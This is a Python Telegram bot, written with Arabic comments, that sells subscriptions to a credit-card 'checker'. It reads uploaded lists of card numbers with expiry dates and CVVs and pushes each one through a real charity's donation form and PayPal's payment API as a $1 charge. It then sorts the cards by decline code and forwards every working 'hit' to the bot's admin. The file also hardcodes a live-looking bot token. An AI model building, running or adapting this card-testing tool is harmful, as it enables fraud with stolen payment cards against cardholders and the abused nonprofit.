import os
import json
import random
import asyncio
import time
import requests
import requests,base64
r=requests.Session()
import re
import base64
import string
from user_agent import *
user=generate_user_agent()
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from requests_toolbelt.multipart.encoder import MultipartEncoder

# ========================================================
# إعدادات البوت
# ========================================================
BOT_TOKEN = "8680723152:AAEGDndik3KsdOj9aoxKvrq2UQZWVQoaRJM"
ADMIN_ID = 8076256532

# ملفات البيانات
USERS_FILE = "paypal_users.json"
CODES_FILE = "paypal_codes.json"

def load_json(filename):
    if os.path.exists(filename):
        with open(filename, 'r') as f: 
            return json.load(f)
    return {}

def save_json(filename, data):
    with open(filename, 'w') as f: 
        json.dump(data, f, indent=2)

# ==================== دالة فحص PayPal CVV (مباشرة من الأداة) ====================

def generate_user_agent():
    """دالة لإنشاء User-Agent عشوائي (بدون مكتبة خارجية)"""
    platforms = [
        {'os': 'Windows', 'version': '10.0', 'webkit': '537.36', 'chrome': '137.0.0.0'},
        {'os': 'Windows', 'version': '10.0', 'webkit': '537.36', 'chrome': '124.0.0.0'},
        {'os': 'Linux', 'version': 'Android 10', 'webkit': '537.36', 'chrome': '137.0.0.0'},
        {'os': 'Linux', 'version': 'Android 10', 'webkit': '537.36', 'chrome': '124.0.0.0'},
        {'os': 'iPhone', 'version': 'CPU iPhone OS 16_0', 'webkit': '605.1.15', 'safari': '604.1'},
        {'os': 'Macintosh', 'version': 'Intel Mac OS X 10_15_7', 'webkit': '537.36', 'chrome': '137.0.0.0'},
    ]
    
    platform = random.choice(platforms)
    
    if platform['os'] == 'Windows':
        return f"Mozilla/5.0 (Windows NT {platform['version']}; Win64; x64) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Chrome/{platform['chrome']} Safari/{platform['webkit']}"
    elif platform['os'] == 'Linux':
        return f"Mozilla/5.0 (Linux; {platform['version']}; K) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Chrome/{platform['chrome']} Mobile Safari/{platform['webkit']}"
    elif platform['os'] == 'iPhone':
        return f"Mozilla/5.0 ({platform['version']} like Mac OS X) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/{platform['safari']}"
    elif platform['os'] == 'Macintosh':
        return f"Mozilla/5.0 (Macintosh; {platform['version']}) AppleWebKit/{platform['webkit']} (KHTML, like Gecko) Chrome/{platform['chrome']} Safari/{platform['webkit']}"

def check_paypal_cvv_exact(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]	
	headers = {
	    'authority': 'www.northidahowaterpolo.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}

	try:
		get_main = r.get('https://www.northidahowaterpolo.org/donations/donation-form/', headers=headers)
		id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', get_main.text).group(1)
		id_form2 = re.search(r'name="give-form-id" value="(.*?)"', get_main.text).group(1)
		nonec = re.search(r'name="give-form-hash" value="(.*?)"', get_main.text).group(1)
		enc = re.search(r'"data-client-token":"(.*?)"', get_main.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
	except Exception as e:
		return f"Error updating tokens: {str(e)}"
	
	headers = {
	    'authority': 'www.northidahowaterpolo.org',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.northidahowaterpolo.org',
	    'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'give-honeypot': '',
	    'give-form-id-prefix': id_form1,
	    'give-form-id': id_form2,
	    'give-form-title': 'Support our cause',
	    'give-current-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
	    'give-form-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
	    'give-form-minimum': '1.00',
	    'give-form-maximum': '999999.99',
	    'give-form-hash': nonec,
	    'give-price-id': '0',
	    'give-amount': '1.00',
	    'give_stripe_payment_method': '',
	    'payment-mode': 'paypal-commerce',
	    'give_first': 'mariam',
	    'give_last': 'mariam',
	    'give_email': 'm38640746@gmail.com',
	    'im_donating_in_the_name_of': 'Myself',
	    'organization_honoree_name': 'mnbb',
	    'donation_purpose': '',
	    'leave_us_a_comment': '',
	    'tell_us_how_you_heard_of_us': '',
	    'card_name': 'kj',
	    'card_exp_month': '',
	    'card_exp_year': '',
	    'give_action': 'purchase',
	    'give-gateway': 'paypal-commerce',
	    'action': 'give_process_donation',
	    'give_ajax': 'true',
	}
	
	response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	
	data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, 'Support our cause'),
	    'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
	    'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
	    'give-form-minimum': (None, '1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, '0'),
	    'give-amount': (None, '1.00'),
	    'give_stripe_payment_method': (None, ''),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'mariam'),
	    'give_last': (None, 'mariam'),
	    'give_email': (None, 'm38640746@gmail.com'),
	    'im_donating_in_the_name_of': (None, 'Myself'),
	    'organization_honoree_name': (None, 'mnbb'),
	    'donation_purpose': (None, ''),
	    'leave_us_a_comment': (None, ''),
	    'tell_us_how_you_heard_of_us': (None, ''),
	    'card_name': (None, 'kj'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
	headers = {
	    'authority': 'www.northidahowaterpolo.org',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'content-type': data.content_type,
	    'origin': 'https://www.northidahowaterpolo.org',
	    'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'action': 'give_paypal_commerce_create_order',
	}
	
	response = r.post(
	    'https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
	tok = (response.json()['data']['id'])
	
	
	headers = {
	    'authority': 'cors.api.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'payment_source': {
	        'card': {
	            'number': n,
	            'expiry': f'20{yy}-{mm}',
	            'security_code': cvc,
	            'attributes': {
	                'verification': {
	                    'method': 'SCA_WHEN_REQUIRED',
	                },
	            },
	        },
	    },
	    'application_context': {
	        'vault': False,
	    },
	}
	
	response = r.post(
	    f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
	    headers=headers,
	    json=json_data,
	)
	data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, 'Support our cause'),
	    'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
	    'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
	    'give-form-minimum': (None, '1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, '0'),
	    'give-amount': (None, '1.00'),
	    'give_stripe_payment_method': (None, ''),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'mariam'),
	    'give_last': (None, 'mariam'),
	    'give_email': (None, 'm38640746@gmail.com'),
	    'im_donating_in_the_name_of': (None, 'Myself'),
	    'organization_honoree_name': (None, 'mnbb'),
	    'donation_purpose': (None, ''),
	    'leave_us_a_comment': (None, ''),
	    'tell_us_how_you_heard_of_us': (None, ''),
	    'card_name': (None, 'kj'),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
	
	headers = {
	    'authority': 'www.northidahowaterpolo.org',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'content-type': data.content_type,
	    'origin': 'https://www.northidahowaterpolo.org',
	    'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'action': 'give_paypal_commerce_approve_order',
	    'order': tok,
	}
	
	response = r.post(
	    'https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
	
	text = response.text
	if 'true' in text or 'sucsess' in text:    
		return "Charge!"
	elif 'DO_NOT_HONOR' in text:
		return "DO_NOT_HONOR"
	elif 'ACCOUNT_CLOSED' in text:
		return "ACCOUNT_CLOSED"
	elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
		return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
	elif 'LOST_OR_STOLEN' in text:
		return "LOST_OR_STOLEN"
	elif 'CVV2_FAILURE' in text:
		return "CVV2_FAILURE"
	elif 'SUSPECTED_FRAUD' in text:
		return "SUSPECTED_FRAUD"
	elif 'INVALID_ACCOUNT' in text:
		return "INVALID_ACCOUNT"
	elif 'REATTEMPT_NOT_PERMITTED' in text:
		return "REATTEMPT_NOT_PERMITTED"
	elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
		return "ACCOUNT_BLOCKED_BY_ISSUER"
	elif 'ORDER_NOT_APPROVED' in text:
		return "ORDER_NOT_APPROVED"
	elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
		return "PICKUP_CARD_SPECIAL_CONDITIONS"
	elif 'PAYER_CANNOT_PAY' in text:
		return "PAYER_CANNOT_PAY"
	elif 'INSUFFICIENT_FUNDS' in text:
		return "INSUFFICIENT_FUNDS"
	elif 'GENERIC_DECLINE' in text:
		return "GENERIC_DECLINE"
	elif 'COMPLIANCE_VIOLATION' in text:
		return "COMPLIANCE_VIOLATION"
	elif 'TRANSACTION_NOT_PERMITTED' in text:
		return "TRANSACTION_NOT_PERMITTED"
	elif 'PAYMENT_DENIED' in text:
		return "PAYMENT_DENIED"
	elif 'INVALID_TRANSACTION' in text:
		return "INVALID_TRANSACTION"
	elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
		return "RESTRICTED_OR_INACTIVE_ACCOUNT"
	elif 'SECURITY_VIOLATION' in text:
		return "SECURITY_VIOLATION"
	elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
		return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
	elif 'INVALID_OR_RESTRICTED_CARD' in text:
		return "INVALID_OR_RESTRICTED_CARD"
	elif 'EXPIRED_CARD' in text:
		return "EXPIRED_CARD"
	elif 'CRYPTOGRAPHIC_FAILURE' in text:
		return "CRYPTOGRAPHIC_FAILURE"
	elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
		return "TRANSACTION_CANNOT_BE_COMPLETED"
	elif 'DECLINED_PLEASE_RETRY' in text:
		return "DECLINED_PLEASE_RETRY_LATER"
	elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
		return "TX_ATTEMPTS_EXCEED_LIMIT"
	else:
		try:
			result = response.json()['data']['error']
			return result
		except:
			return "UNKNOWN_ERROR"
			
# ==================== إدارة الفحص ====================

class ScanManager:
    def __init__(self): 
        self.active = {}
    
    def start(self, user_id): 
        self.active[user_id] = True
    
    def stop(self, user_id): 
        self.active[user_id] = False
    
    def is_running(self, user_id): 
        return self.active.get(user_id, False)

scan_manager = ScanManager()

# ==================== أوامر البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    await update.message.reply_text(
        f"🚀 أهلاً بك في بوت PayPal CVV المطور!\n\n"
        f"📋 أرسل ملف .txt يحتوي على الكروت لبدء الفحص.\n"
        f"🛠 لوحة التحكم: /admin (للأدمن فقط)\n"
        f"🌐 البوابة: walsingham.org.uk\n"
        f"⚡ الأداة: DrGaM Gate الأصلية\n"
        f"🔥 الردود: حقيقية 100%\n\n"
        f"💡 تم تثبيت نفس كود الأداة التي تعمل لديك!"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # التحقق من الاشتراك
    users = load_json(USERS_FILE)
    if str(user_id) not in users and user_id != ADMIN_ID:
        await update.message.reply_text("❌ ليس لديك اشتراك! تواصل مع الأدمن.")
        return
        
    if update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        cards = content.decode('utf-8').splitlines()
        
        # فلترة البطاقات الفارغة
        cards = [card.strip() for card in cards if card.strip()]
        
        if not cards:
            await update.message.reply_text("❌ الملف فارغ أو لا يحتوي على كروت صالحة!")
            return
        
        context.user_data['cards'] = cards
        
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Start DrGaM Gate", callback_data="start_scan")],
            [InlineKeyboardButton("🧪 Test Single Card", callback_data="test_single")]
        ])
        
        await update.message.reply_text(
            f"✅ تم استلام {len(cards)} كارت.\n"
            f"🌐 البوابة: walsingham.org.uk\n"
            f"⚡ الأداة: DrGaM Gate\n\n"
            f"اضغط لبدء الفحص:",
            reply_markup=markup
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if query.data == "start_scan":
        cards = context.user_data.get('cards', [])
        if not cards:
            await query.answer("❌ لا توجد كروت!")
            return
            
        scan_manager.start(user_id)
        
        await query.edit_message_text(
            f"⏳ جاري بدء الفحص...\n\n"
            f"🌐 البوابة: walsingham.org.uk\n"
            f"📁 عدد الكروت: {len(cards)}\n"
            f"⚡ الأداة: DrGaM Gate\n"
            f"⏱️ جاري التجهيز..."
        )
        
        asyncio.create_task(run_paypal_scan(context, user_id, cards, query.message))
        
    elif query.data == "stop_scan":
        scan_manager.stop(user_id)
        await query.answer("🛑 تم إيقاف الفحص.")
        
    elif query.data == "test_single":
        await query.message.reply_text(
            "🧪 أرسل كارت واحد للاختبار (مثال: 4111111111111111|12|25|123):\n"
            "اكتب 'cancel' للإلغاء"
        )
        context.user_data['awaiting_test'] = True

async def handle_test_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_test'):
        card = update.message.text.strip()
        
        if card.lower() == 'cancel':
            await update.message.reply_text("❌ تم إلغاء الاختبار.")
            context.user_data['awaiting_test'] = False
            return
        
        await update.message.reply_text(f"🧪 جاري اختبار الكارت: {card[:20]}...")
        
        try:
            result = await asyncio.get_event_loop().run_in_executor(
                None, check_paypal_cvv_exact, card
            )
            
            await update.message.reply_text(
                f"🧪 **نتيجة الاختبار:**\n\n"
                f"💳 الكارت: {card}\n"
                f"📊 النتيجة: {result}\n\n"
                f"🌐 البوابة: walsingham.org.uk\n"
                f"⚡ الأداة: DrGaM Gate"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ فشل الاختبار: {str(e)}")
        
        context.user_data['awaiting_test'] = False

async def run_paypal_scan(context, user_id, cards, msg):
    charged = 0
    declined = 0
    processed = 0
    total = len(cards)
    
    start_time = datetime.now()
    
    for index, card in enumerate(cards, 1):
        if not scan_manager.is_running(user_id): 
            break
        
        # عرض البطاقة الحالية
        card_display = card[:20] + "..." if len(card) > 20 else card
        
        # تشغيل الفحص
        result = await asyncio.get_event_loop().run_in_executor(
            None, check_paypal_cvv_exact, card
        )
        processed += 1
        
        # تحديد النتيجة
        if "✅" in result or "Charge" in result:
            charged += 1
            
            hit_msg = f"✅ HIT PAYPAL CVV! ⚡\n\n💳 Card: {card}\n📋 Result: {result}\n🌐 Gateway: walsingham.org.uk\n\nChecked By: @i1veno"
            await context.bot.send_message(chat_id=user_id, text=hit_msg, parse_mode='Markdown')
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 ADMIN HIT!\n{hit_msg}", parse_mode='Markdown')
        else:
            declined += 1
        
        # إعداد الـ response للعرض
        response_display = result
        if len(response_display) > 40:
            response_display = response_display[:40] + "..."
        
        # حساب الوقت المنقضي
        elapsed_time = datetime.now() - start_time
        elapsed_seconds = elapsed_time.total_seconds()
        cards_per_minute = (processed / elapsed_seconds * 60) if elapsed_seconds > 0 else 0
        
        # تحديث الأزرار
        status_text = f"{'Running 🔄' if scan_manager.is_running(user_id) else 'Stopped 🛑'}"
        
        buttons = [
            [InlineKeyboardButton(f"STATUS: {status_text}", callback_data="none")],
            [InlineKeyboardButton(f"GATEWAY: walsingham.org.uk", callback_data="none")],
            [InlineKeyboardButton(f"CC [{index}/{total}]: {card_display}", callback_data="none")],
            [InlineKeyboardButton(f"RESPONSE: {response_display}", callback_data="none")],
            [
                InlineKeyboardButton(f"✅ CHARGED: {charged}", callback_data="none"), 
                InlineKeyboardButton(f"❌ DECLINED: {declined}", callback_data="none")
            ],
            [
                InlineKeyboardButton(f"📊 PROGRESS: {processed}/{total}", callback_data="none"),
                InlineKeyboardButton(f"⚡ {cards_per_minute:.1f}/min", callback_data="none")
            ],
            [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
        ]
        
        try:
            await msg.edit_text(
                f"📊 PayPal CVV Progress:\n\n"
                f"🌐 Gateway: walsingham.org.uk\n"
                f"⚡ Tool: DrGaM Gate\n"
                f"⏱️ Elapsed: {int(elapsed_seconds // 60)}:{int(elapsed_seconds % 60):02d}",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
        except Exception as e:
            print(f"خطأ في تحديث الرسالة: {e}")
        
        # تأخير مثل الأداة الأصلية
        delay = random.uniform(1.0, 2.0)
        await asyncio.sleep(delay)
    
    # إرسال تقرير النهاية
    end_time = datetime.now()
    total_time = end_time - start_time
    
    report = (
        f"🏁 **Scan Completed!**\n\n"
        f"📊 **Results Summary:**\n"
        f"✅ Charges: {charged}\n"
        f"❌ Declined: {declined}\n"
        f"📈 Success Rate: {charged/total*100:.1f}%\n\n"
        f"🌐 **Gateway:** walsingham.org.uk\n"
        f"⚡ **Tool:** DrGaM Gate\n\n"
        f"⏱️ **Duration:** {int(total_time.total_seconds() // 60)}:{int(total_time.total_seconds() % 60):02d}\n"
        f"📁 **Total Cards:** {total}\n"
        f"⚡ **Speed:** {(total/total_time.total_seconds()*60):.1f} cards/min"
    )
    
    await context.bot.send_message(chat_id=user_id, text=report, parse_mode='Markdown')

# ==================== لوحة تحكم الأدمن ====================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: 
        return
    
    await update.message.reply_text(
        f"🛠 **لوحة تحكم الأدمن:**\n\n"
        f"👤 Admin ID: {ADMIN_ID}\n"
        f"🌐 Gateway: walsingham.org.uk\n"
        f"⚡ Tool: DrGaM Gate\n\n"
        f"📋 **الأوامر المتاحة:**\n"
        f"/gen [days] - توليد كود اشتراك\n"
        f"/users - عرض المشتركين\n"
        f"/add [user_id] - إضافة مستخدم يدوياً"
    )

async def gen_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: 
        return
    try:
        days = int(context.args[0])
        code = f"R3D-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        codes = load_json(CODES_FILE)
        codes[code] = days
        save_json(CODES_FILE, codes)
        await update.message.reply_text(f"✅ تم توليد كود لمدة {days} يوم:\n`{code}`", parse_mode='Markdown')
    except (IndexError, ValueError):
        await update.message.reply_text("❌ الاستخدام: /gen [عدد الأيام]")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        code = context.args[0]
        codes = load_json(CODES_FILE)
        if code in codes:
            days = codes.pop(code)
            users = load_json(USERS_FILE)
            expiry = datetime.now() + timedelta(days=days)
            users[str(user_id)] = {"expiry": expiry.isoformat()}
            save_json(USERS_FILE, users)
            save_json(CODES_FILE, codes)
            await update.message.reply_text(f"✅ تم تفعيل اشتراكك لمدة {days} يوم!")
        else:
            await update.message.reply_text("❌ كود غير صالح!")
    except IndexError:
        await update.message.reply_text("❌ الاستخدام: /redeem [الكود]")

# ==================== التشغيل ====================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("gen", gen_code))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_test_card))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("=" * 60)
    print("💰 PayPal CVV Bot - DrGaM Gate Integration")
    print("🌐 Gateway: walsingham.org.uk")
    print("⚡ Tool: Exact DrGaM Gate Code")
    print("✅ Status: Ready with Real Responses")
    print("=" * 60)
    
    app.run_polling()

if __name__ == "__main__":
    main()